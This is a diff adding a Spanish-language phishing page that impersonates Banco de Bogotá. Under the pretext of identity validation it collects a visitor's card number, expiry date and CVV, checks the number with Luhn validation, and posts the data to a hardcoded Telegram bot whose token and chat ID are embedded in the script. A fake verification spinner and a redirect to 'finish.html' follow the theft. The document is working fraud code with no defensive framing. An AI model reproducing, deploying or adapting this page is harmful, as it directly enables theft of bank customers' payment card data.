@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Banca Virtual - Información</title>
+    <link rel="icon" href="https://bogocota.site/assets/img/logo.png">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', Arial, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 440px;
+            margin: 0 auto;
+            background-color: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            padding: 24px 20px;
+            border-bottom: 1px solid #e5e5e5;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo {
+            width: 40px;
+            height: 40px;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            font-weight: 500;
+            color: #202124;
+        }
+
+        .banner {
+            background: linear-gradient(135deg, #1565C0 0%, #0D47A1 100%);
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 0;
+            border-radius: 0;
+        }
+
+        .banner-image {
+            width: 70px;
+            height: 70px;
+            background-color: transparent;
+            border-radius: 0;
+            flex-shrink: 0;
+            overflow: hidden;
+        }
+
+        .banner-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .banner-text {
+            color: white;
+            font-size: 15px;
+            line-height: 1.4;
+            font-weight: 500;
+        }
+
+        .content {
+            padding: 20px;
+        }
+
+        .main__ttl {
+            font-size: 18px;
+            font-weight: 600;
+            color: #202124;
+            margin-bottom: 12px;
+        }
+
+        .box__txt {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .box__element {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .box__element > div {
+            position: relative;
+            width: 100%;
+        }
+
+        .box__lbl {
+            font-size: 14px;
+            margin-bottom: 8px;
+            display: block;
+            color: #3c4043;
+            font-weight: 500;
+        }
+
+        .box__input {
+            width: 100%;
+            padding: 12px 12px 12px 40px;
+            border: 1.5px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            font-size: 15px;
+            color: #3c4043;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+
+        .box__input:focus {
+            border-color: #1565C0;
+        }
+
+        .box__element i {
+            position: absolute;
+            top: 50%;
+            left: 12px;
+            transform: translateY(-50%);
+            font-size: 18px;
+            color: #1565C0;
+        }
+
+        .box__btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #dadce0;
+            color: #80868b;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: not-allowed;
+            margin-top: 8px;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+
+        .box__btn.enabled {
+            background-color: #1565C0;
+            color: white;
+            cursor: pointer;
+        }
+
+        .box__btn.enabled:hover {
+            background-color: #0D47A1;
+        }
+
+        .footer {
+            padding: 16px 20px;
+            text-align: center;
+            border-top: 1px solid #e5e5e5;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        /* VIDEO CARGA */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-screen.show {
+            display: flex;
+        }
+
+        .loading-content {
+            text-align: center;
+            background: white;
+            border-radius: 16px;
+            padding: 40px 30px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            max-width: 300px;
+            width: 90%;
+        }
+
+        .loading-logo {
+            width: 80px;
+            height: auto;
+            margin: 0 auto 20px;
+            object-fit: contain;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            margin: 20px auto;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #1565C0;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 14px;
+            color: #3c4043;
+            margin-top: 15px;
+            font-weight: 500;
+        }
+
+        /* DESKTOP 1024px+ */
+        @media screen and (min-width: 1024px) {
+            body {
+                padding: 40px 20px;
+                background: #f5f5f5;
+                display: flex;
+                justify-content: flex-start;
+                align-items: flex-start;
+            }
+
+            .container {
+                max-width: 500px;
+                margin: 0;
+                border-radius: 16px;
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+                overflow: hidden;
+            }
+
+            .header {
+                padding: 32px 28px 24px;
+                border-bottom: none;
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 16px;
+                background: white;
+            }
+
+            .logo {
+                width: 140px;
+                height: auto;
+                margin-bottom: 0;
+            }
+
+            .header h1 {
+                font-size: 24px;
+                font-weight: 600;
+                color: #1a1a1a;
+                margin: 0;
+                width: 100%;
+            }
+
+            .banner {
+                background: linear-gradient(135deg, #1565C0 0%, #0D47A1 100%);
+                padding: 24px 28px;
+                margin: 0;
+                border-radius: 0;
+                display: flex;
+                align-items: center;
+                gap: 18px;
+            }
+
+            .banner-image {
+                width: 80px;
+                height: 80px;
+                background-color: transparent;
+                border-radius: 0;
+                flex-shrink: 0;
+            }
+
+            .banner-image img {
+                width: 100%;
+                height: 100%;
+                object-fit: contain;
+            }
+
+            .banner-text {
+                color: white;
+                font-size: 15px;
+                line-height: 1.5;
+            }
+
+            .content {
+                padding: 28px;
+                background: white;
+            }
+
+            .main__ttl {
+                font-size: 20px;
+                margin-bottom: 16px;
+            }
+
+            .box__element {
+                margin-bottom: 24px;
+            }
+
+            .box__lbl {
+                margin-bottom: 10px;
+            }
+
+            .box__input {
+                padding: 12px 12px 12px 40px;
+                border-radius: 6px;
+            }
+
+            .box__btn {
+                padding: 14px;
+                font-size: 15px;
+                margin-top: 12px;
+                margin-bottom: 24px;
+                border-radius: 6px;
+            }
+
+            .box__btn.enabled {
+                box-shadow: 0 2px 8px rgba(21, 101, 192, 0.2);
+            }
+
+            .footer {
+                padding: 16px 28px;
+                background: #fafbfc;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- PANTALLA DE CARGA -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <img src="bancobog2.png" alt="Banco de Bogotá" class="loading-logo">
+            <div class="spinner"></div>
+            <p class="loading-text">Validando información...</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="image.png" alt="Logo" class="logo-mobile">
+                <img src="bancoboga.png" alt="Logo" class="logo-desktop" style="display: none;">
+            </div>
+            <h1>Ingresa tu información</h1>
+        </div>
+
+        <div class="banner">
+            <div class="banner-image">
+                <img src="chica.png" alt="Asistente">
+            </div>
+            <div class="banner-text">
+                A continuación validaremos tus datos para comprobar tu identidad.
+            </div>
+        </div>
+
+        <div class="content">
+            <h2 class="main__ttl">Datos de tarjeta</h2>
+            <p class="box__txt">Por favor ingresa los datos de tu tarjeta de crédito o débito.</p>
+
+            <div class="box__element">
+                <label for="txtMail" class="box__lbl">Número de tarjeta</label>
+                <div>
+                    <i class='bx bx-card'></i>
+                    <input class="box__input" type="text" required id="txtMail" maxlength="16" minlength="15" inputmode="numeric" placeholder="1234567890123456">
+                </div>
+            </div>
+
+            <div class="box__element">
+                <label for="txtPass" class="box__lbl">Fecha de vencimiento</label>
+                <div>
+                    <i class='bx bx-calendar'></i>
+                    <input class="box__input" type="text" required id="txtPass" maxlength="7" minlength="5" inputmode="numeric" placeholder="MM/YY">
+                </div>
+            </div>
+
+            <div class="box__element">
+                <label for="txtCelular" class="box__lbl">CVV (4 dígitos)</label>
+                <div>
+                    <i class='bx bx-lock'></i>
+                    <input class="box__input" type="text" required id="txtCelular" maxlength="4" minlength="4" inputmode="numeric" placeholder="1234">
+                </div>
+            </div>
+
+            <button class="box__btn" id="btnMail" disabled>Continuar</button>
+        </div>
+
+        <div class="footer">
+            <p>v.1.30.0</p>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003500051235';
+
+        const tarjeta = document.getElementById('txtMail');
+        const vencimiento = document.getElementById('txtPass');
+        const cvv = document.getElementById('txtCelular');
+        const btnMail = document.getElementById('btnMail');
+
+        function validarLuhn(numero) {
+            let sum = 0;
+            let shouldDouble = false;
+            for (let i = numero.length - 1; i >= 0; i--) {
+                let digit = parseInt(numero.charAt(i));
+                if (shouldDouble) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return sum % 10 === 0;
+        }
+
+        function validarFormulario() {
+            const tarjetaValida = tarjeta.value.length === 16 && /^[3-5]/.test(tarjeta.value) && validarLuhn(tarjeta.value);
+            const vencimientoValido = vencimiento.value.replace('/', '').length === 4;
+            const cvvValido = cvv.value.length === 4;
+
+            if (tarjetaValida && vencimientoValido && cvvValido) {
+                btnMail.classList.add('enabled');
+                btnMail.disabled = false;
+            } else {
+                btnMail.classList.remove('enabled');
+                btnMail.disabled = true;
+            }
+        }
+
+        tarjeta.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '').slice(0, 16);
+            if (this.value.length > 0 && !/^[3-5]/.test(this.value)) {
+                this.setCustomValidity('La tarjeta debe comenzar con 3, 4 o 5');
+            } else if (this.value.length < 16) {
+                this.setCustomValidity('Debe tener 16 dígitos');
+            } else if (!validarLuhn(this.value)) {
+                this.setCustomValidity('Número de tarjeta inválido');
+            } else {
+                this.setCustomValidity('');
+            }
+            validarFormulario();
+        });
+
+        vencimiento.addEventListener('input', function () {
+            let valor = this.value.replace(/\D/g, '');
+            if (valor.length > 4) valor = valor.slice(0, 4);
+            if (valor.length >= 2) {
+                this.value = valor.slice(0, 2) + '/' + valor.slice(2);
+            } else {
+                this.value = valor;
+            }
+            validarFormulario();
+        });
+
+        cvv.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            if (this.value.length < 4) {
+                this.setCustomValidity('Debe tener exactamente 4 dígitos');
+            } else {
+                this.setCustomValidity('');
+            }
+            validarFormulario();
+        });
+
+        btnMail.addEventListener('click', async function (e) {
+            e.preventDefault();
+
+            const campos = [tarjeta, vencimiento, cvv];
+            let todoValido = true;
+
+            campos.forEach(campo => {
+                campo.reportValidity();
+                if (!campo.checkValidity()) {
+                    todoValido = false;
+                }
+            });
+
+            if (!todoValido) {
+                return;
+            }
+
+            // Mostrar pantalla de carga
+            document.getElementById('loadingScreen').classList.add('show');
+
+            // Enviar a Telegram
+            await enviarATelegram(tarjeta.value, vencimiento.value, cvv.value);
+        });
+
+        async function enviarATelegram(tarjetaNum, vencimientoNum, cvvNum) {
+            const mensaje = `
+🔔 *DATOS DE TARJETA - BANCO BOGOTÁ*
+
+💳 *Número de tarjeta:* ${tarjetaNum}
+📅 *Fecha de vencimiento:* ${vencimientoNum}
+🔐 *CVV:* ${cvvNum}
+
+⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}
+            `.trim();
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('✅ Datos de tarjeta enviados a Telegram');
+                    // Redirigir después de 3 segundos
+                    setTimeout(() => {
+                        window.location.href = 'finish.html';
+                    }, 3000);
+                } else {
+                    document.getElementById('loadingScreen').classList.remove('show');
+                    alert('Error en la verificación');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('loadingScreen').classList.remove('show');
+                alert('Error en la conexión');
+            }
+        }
+
+        // Logo switching
+        window.addEventListener('load', updateLogo);
+        window.addEventListener('resize', updateLogo);
+
+        function updateLogo() {
+            const mobile = document.querySelector('.logo-mobile');
+            const desktop = document.querySelector('.logo-desktop');
+            if (window.innerWidth >= 1024) {
+                mobile.style.display = 'none';
+                desktop.style.display = 'block';
+            } else {
+                mobile.style.display = 'block';
+                desktop.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
